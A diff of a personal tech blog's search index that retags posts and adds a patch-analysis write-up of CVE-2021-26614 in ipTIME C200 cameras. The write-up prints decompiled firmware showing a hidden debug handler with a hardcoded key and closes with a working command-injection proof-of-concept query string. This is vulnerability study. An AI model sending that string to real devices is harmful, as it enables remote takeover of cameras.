@@ -48,7 +48,7 @@
 <p><img src="/2024/06/01/OpenAI-APIKey%E7%94%B3%E8%AF%B7%E6%95%99%E7%A8%8B/2024-06-01-13-23-50-image.png"></p>
 ]]></content>
       <tags>
-        <tag>效率</tag>
+        <tag>日常</tag>
       </tags>
   </entry>
   <entry>
@@ -82,12 +82,12 @@
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>好像确实没有在线的<code>ChatGPT4-o</code>好用</p>
 ]]></content>
       <tags>
-        <tag>LLM</tag>
+        <tag>AI</tag>
       </tags>
   </entry>
   <entry>
     <title>R2S软路由搭建指南</title>
-    <url>/2024/06/29/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</url>
+    <url>/2024/08/02/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</url>
     <content><![CDATA[<p>在一般访问Google等网站的情况下，往往需要在每个终端安装代理软件，如<code>Clash</code>，<code>SSR</code>等。而软路由的方式让我们对其访问变得无感。百科上对软路由的定义如下，即使用软件的方案来进行路由：</p>
 <blockquote>
 <p>软路由是指利用台式机或服务器的供应商配合一定软件而形成的路由解决方案，主要靠对软件的设置，实现路由器路由器的功能，它的软件与硬件是独立分开的。软路由使用普通计算机，使用通用的操作系统，如Linux或windows，因此软路由的设置事实上是windows或linux的设置。根据使用的操作系统不同，可以分为基于windows平台和基于Linux&#x2F;bsd平台开发的软件路由器。</p>
@@ -96,35 +96,35 @@
 
 <h2 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h2><p>Nanopi R2S</p>
 <p>最低价可以买裸板，TF卡自己单买的，5v3a&#x2F;2a电源使用之前的旧设备。读卡器已有</p>
-<p><img src="/2024/06/29/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-06-06-image.png"></p>
+<p><img src="/2024/08/02/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-06-06-image.png"></p>
 <p>64GTF卡</p>
-<p><img src="/2024/06/29/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-10-18-image.png"></p>
+<p><img src="/2024/08/02/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-10-18-image.png"></p>
 <h2 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h2><p>使用<code>FriendlyWrt</code>系统，镜像下载：</p>
 <p><a href="https://drive.google.com/drive/folders/1W-2MLML9lkD2xAVjiwzEBNiUlPF5BgU9">01_SD card images - Google 云端硬盘</a></p>
 <ul>
 <li>rk3328-sd-friendlywrt-23.05-20231223.img.gz</li>
 </ul>
 <p><code>balenaEtcher</code>烧录至TF卡</p>
-<p><img src="/2024/06/29/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-15-56-image.png"></p>
+<p><img src="/2024/08/02/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-15-56-image.png"></p>
 <h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><p>网络结构比较简单，如下<br>光猫&lt;——–&gt;(WAN)R2S(LAN)&lt;——–&gt;(WAN)小米路由器</p>
 <p>等待开机后，访问<code>192.168.2.1</code>。使用<code>root/passowrd</code>即可进入FriendlyWrt的管理后台</p>
-<p><img src="/2024/06/29/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-35-01-image.png"></p>
+<p><img src="/2024/08/02/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-35-01-image.png"></p>
 <h2 id="OpenClash配置"><a href="#OpenClash配置" class="headerlink" title="OpenClash配置"></a>OpenClash配置</h2><p>如<code>OpenClash</code>描述，需要安装客户端与内核模块</p>
 <p>客户端安装</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装依赖</span></span><br><span class="line">* luci</span><br><span class="line">* luci-base</span><br><span class="line">* iptables</span><br><span class="line">* dnsmasq-full</span><br><span class="line">* coreutils</span><br><span class="line">* coreutils-nohup</span><br><span class="line">* bash</span><br><span class="line">* curl</span><br><span class="line">* jsonfilter</span><br><span class="line">* ca-certificates</span><br><span class="line">* ipset</span><br><span class="line">* ip-full</span><br><span class="line">* iptables-mod-tproxy</span><br><span class="line">* kmod-tun(TUN模式)</span><br><span class="line">* luci-compat(Luci-19.07)</span><br><span class="line"></span><br><span class="line"><span class="comment">#上传IPK文件至您路由器的 /tmp 目录下</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#假设安装包名字为</span></span><br><span class="line">luci-app-openclash_0.33.7-beta_all.ipk</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行安装命令</span></span><br><span class="line">opkg install /tmp/luci-app-openclash_0.33.7-beta_all.ipk</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行卸载命令</span></span><br><span class="line"><span class="comment">#插件在卸载后会自动备份配置文件到 /tmp 目录下，除非路由器重启，在下次安装时将还原您的配置文件</span></span><br><span class="line">opkg remove luci-app-openclash</span><br><span class="line"></span><br><span class="line">安装完成后刷新LUCI页面，在菜单栏 -&gt; 服务 -&gt; OpenClash 进入插件页面</span><br></pre></td></tr></table></figure>
 
 <p>内核</p>
 <p>进入<code>OpenClash</code>插件页面时，总是下载失败。可以增加代理来完成安装</p>
-<p><img src="/2024/06/29/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-40-11-image.png"></p>
+<p><img src="/2024/08/02/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-40-11-image.png"></p>
 <p>启动</p>
 <p>最后，上传配置文件，并启动即可。最终效果如下</p>
-<p><img src="/2024/06/29/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-41-41-image.png"></p>
+<p><img src="/2024/08/02/R2S%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/2024-02-21-21-41-41-image.png"></p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://wiki.friendlyelec.com/wiki/index.php/NanoPi_R2S/zh">https://wiki.friendlyelec.com/wiki/index.php/NanoPi_R2S/zh</a></p>
 <p><a href="https://wiki.mbalib.com/wiki/%E8%BD%AF%E8%B7%AF%E7%94%B1">软路由 - MBA智库百科</a></p>
 <p><a href="https://github.com/vernesong/OpenClash/releases">Releases · vernesong&#x2F;OpenClash · GitHub</a></p>
 ]]></content>
       <tags>
-        <tag>Google</tag>
+        <tag>日常</tag>
       </tags>
   </entry>
   <entry>
@@ -322,7 +322,7 @@
 <p><em>Tcache in glibc</em> Angelboy</p>
 ]]></content>
       <tags>
-        <tag>Pwn</tag>
+        <tag>OS</tag>
       </tags>
   </entry>
   <entry>
@@ -801,6 +801,57 @@
 ]]></content>
       <tags>
         <tag>转载</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2021-26614 ipTIME摄像头RCE漏洞分析</title>
+    <url>/2024/07/29/CVE-2021-26614-ipTIME%E6%91%84%E5%83%8F%E5%A4%B4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><blockquote>
+<p>□ Overview<br>o EFMNetworks Co.,Ltd released security update to address remote code execution vulnerability in IpTime C200 camara.<br>Vulnerability Type	Impact	Severity	CVSS Score	CVE ID<br>Exposed dangerous method<br>or function	remote code execution	High	7.5	CVE-2021-26614<br>□ Description<br>o ius_get.cgi in IpTime C200 camera allows remote code execution. A remote attacker may send a crafted parameters to the exposed vulnerable web service interface which invokes the arbitrary shell command.</p>
+<p>□ Affected Product<br>Product	Version	Platform<br>IpTime C200 Camera	1.058 or prior	Ubuntu 20.04</p>
+<p>□ Solution<br>o Update firmware over IpTime C200 Camera 1.060 version or higher.</p>
+<p>□ Reference<br>[1] <a href="http://iptime.com/iptime/?page_id=126&pageid=1&mod=&keyword=C200&uid=24015">http://iptime.com/iptime/?page_id=126&amp;pageid=1&amp;mod=&amp;keyword=C200&amp;uid=24015</a></p>
+<p>□ Acknowledgements<br>[1] Thanks to Inhyeong Yi and Jaehyeong Yi for reporting this vulnerability.</p>
+</blockquote>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该漏洞存在于版本<code>1.06</code>之前，并已发布版本，尝试进行补丁分析</p>
+<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>首先下载前后两个固件并解包</p>
+<ul>
+<li><a href="https://iptime.com/iptime/?pageid=2&page_id=126&keyword=C200&uid=24015&mod=document">https://iptime.com/iptime/?pageid=2&amp;page_id=126&amp;keyword=C200&amp;uid=24015&amp;mod=document</a></li>
+</ul>
+<p>没有加密，直接binwalk解包即可</p>
+<p>查找目标文件<code>iux_get.cgi</code></p>
+<p><img src="/2024/07/29/CVE-2021-26614-ipTIME%E6%91%84%E5%83%8F%E5%A4%B4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240729151425537.png" alt="image-20240729151425537"></p>
+<p>对这两个<code>iux_get.cgi</code>进行diff对比</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[  3:18PM ]  [ c0r3dump@ArchLinux:/mnt/hgfs/shared_dir/diff_dir ]</span><br><span class="line"> $ <span class="built_in">ls</span> -lh ./</span><br><span class="line">total 171K</span><br><span class="line">-rwxrwxrwx 1 root root 86K Jul 29 15:16 iux_get_58.cgi</span><br><span class="line">-rwxrwxrwx 1 root root 86K Jul 29 15:18 iux_get_60.cgi</span><br><span class="line">[  3:18PM ]  [ c0r3dump@ArchLinux:/mnt/hgfs/shared_dir/diff_dir ]</span><br><span class="line"> $ <span class="built_in">cp</span> ../_c200_1_060.bin.extracted/squashfs-root/usr/www/cgi/iux_get.cgi ./iux_get_60.cgi</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Bindiff</p>
+<ul>
+<li><a href="https://github.com/google/bindiff/releases">https://github.com/google/bindiff/releases</a></li>
+<li>指定IDA安装位置后使用</li>
+</ul>
+<p><img src="/2024/07/29/CVE-2021-26614-ipTIME%E6%91%84%E5%83%8F%E5%A4%B4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240729155246852.png" alt="image-20240729155246852"></p>
+<p>只有一个<code>0x401B04</code>相似度偏差最大</p>
+<p><img src="/2024/07/29/CVE-2021-26614-ipTIME%E6%91%84%E5%83%8F%E5%A4%B4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240729155711415.png" alt="image-20240729155711415"></p>
+<p>删除了此部分逻辑，进行查看</p>
+<p><img src="/2024/07/29/CVE-2021-26614-ipTIME%E6%91%84%E5%83%8F%E5%A4%B4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240729155909989.png" alt="image-20240729155909989"></p>
+<p>具体定位到如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v3 = (<span class="type">const</span> <span class="type">char</span> *)getenv(<span class="string">&quot;QUERY_STRING&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(v15, <span class="number">1024</span>, <span class="string">&quot;%s&quot;</span>, v3);</span><br><span class="line">  v4 = (<span class="type">const</span> <span class="type">char</span> *)sub_40C890(v15, <span class="string">&quot;tmenu&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(v17, <span class="number">32</span>, <span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  v5 = (<span class="type">const</span> <span class="type">char</span> *)sub_40C890(v15, <span class="string">&quot;smenu&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(v18, <span class="number">32</span>, <span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  v6 = (<span class="type">const</span> <span class="type">char</span> *)sub_40C890(v15, <span class="string">&quot;act&quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(v19, <span class="number">32</span>, <span class="string">&quot;%s&quot;</span>, v6);  </span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;cam&quot;</span>, v17) &amp;&amp; !<span class="built_in">strcmp</span>(<span class="string">&quot;debug&quot;</span>, v18) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_409748((<span class="type">int</span>)v15);</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>从请求的变量中获取参数</li>
+<li><code>tmenu=cam &amp;&amp; smenu=debug</code></li>
+<li>sub_409748</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_409748</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// $t8</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="type">int</span> cmdString; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+28h] [+28h]</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">512</span>]; <span class="comment">// [sp+2Ch] [+2Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">4100</span>]; <span class="comment">// [sp+22Ch] [+22Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5 = sub_40C890(a1, (<span class="type">int</span>)<span class="string">&quot;act&quot;</span>);              <span class="comment">// 返回act参数对应的值，即atc=value,返回value</span></span><br><span class="line">  <span class="keyword">if</span> ( !v5 || <span class="built_in">strcmp</span>(v5, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v8 = sub_40C890(a1, (<span class="type">int</span>)<span class="string">&quot;aaksjdkfj&quot;</span>);        <span class="comment">// 返回aaksjdkfj参数对应的value</span></span><br><span class="line">  <span class="keyword">if</span> ( !v8 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)v8 == <span class="string">&#x27;1&#x27;</span>                      <span class="comment">// value: 11dnjsrurelqjrm22</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">2</span>) == <span class="string">&#x27;d&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">3</span>) == <span class="string">&#x27;n&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">4</span>) == <span class="string">&#x27;j&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">5</span>) == <span class="string">&#x27;s&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">6</span>) == <span class="string">&#x27;r&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">7</span>) == <span class="string">&#x27;u&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">8</span>) == <span class="string">&#x27;r&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">9</span>) == <span class="string">&#x27;e&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">10</span>) == <span class="string">&#x27;l&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">11</span>) == <span class="string">&#x27;q&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">12</span>) == <span class="string">&#x27;j&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">13</span>) == <span class="string">&#x27;r&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">14</span>) == <span class="string">&#x27;m&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">15</span>) == <span class="string">&#x27;2&#x27;</span></span><br><span class="line">    &amp;&amp; *(_BYTE *)(v8 + <span class="number">16</span>) == <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;html&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;center&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;form method=get action=\&quot;iux_get.cgi\&quot; name=\&quot;dform\&quot;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;input type=hidden name=tmenu value=\&quot;cam\&quot;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;input type=hidden name=smenu value=\&quot;debug\&quot;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;input type=hidden name=act value=1&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;File Name : &lt;input type=text name=\&quot;fname\&quot; value=\&quot;\&quot; size=50 maxlength=120&gt;&lt;br&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Command Name : &lt;input type=text name=\&quot;cmd\&quot; value=\&quot;\&quot; size=64 maxlength=256&gt;&lt;br&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&lt;input type=text name=\&quot;aaksjdkfj\&quot; value=\&quot;%s\&quot; size=64 maxlength=256&gt;&lt;br&gt;&lt;br&gt;\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v8);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;input type=submit name=\&quot;dapply\&quot; value=\&quot; Show \&quot;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;/form&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;/center&gt;&lt;br&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">    v6 = sub_40C890(a1, (<span class="type">int</span>)<span class="string">&quot;act&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &amp;&amp; !<span class="built_in">strcmp</span>(v6, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = sub_40C890(a1, (<span class="type">int</span>)<span class="string">&quot;fname&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = fopen(v9, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( fgets(v10, <span class="number">256</span>, v3) )</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;&lt;font size=-1&gt;%s&lt;/font&gt;&lt;br&gt;\n&quot;</span>, v10);</span><br><span class="line">          fclose(v3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;file open error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cmdString = sub_40C890(a1, (<span class="type">int</span>)<span class="string">&quot;cmd&quot;</span>);   <span class="comment">// 获取cmd参数的value</span></span><br><span class="line">      <span class="keyword">if</span> ( cmdString )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_409660(cmdString, v11);             <span class="comment">// 将其拷贝到v11</span></span><br><span class="line">        <span class="built_in">snprintf</span>(v10, <span class="number">512</span>, <span class="string">&quot;%s &gt;&gt; /var/run/cmd_temp&quot;</span>, v11);<span class="comment">// inject,例如 ls /; id</span></span><br><span class="line">        system(v10);</span><br><span class="line">        v4 = fopen(<span class="string">&quot;/var/run/cmd_temp&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>综上分析，即可知poc如下, 即可命令注入</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;tmenu=cam&amp;smenu=debug&amp;act=1&amp;aaksjdkfj=11dnjsrurelqjrm22&amp;cmd=<span class="built_in">whoami</span>;<span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://web.archive.org/web/20211209121323/https://www.boho.or.kr/krcert/secNoticeView.do?bulletin_writing_sequence=36346">https://web.archive.org/web/20211209121323/https://www.boho.or.kr/krcert/secNoticeView.do?bulletin_writing_sequence=36346</a></p>
+<p><a href="https://www.iotsec-zone.com/article/135">https://www.iotsec-zone.com/article/135</a></p>
+]]></content>
+      <tags>
+        <tag>IoT</tag>
       </tags>
   </entry>
 </search>
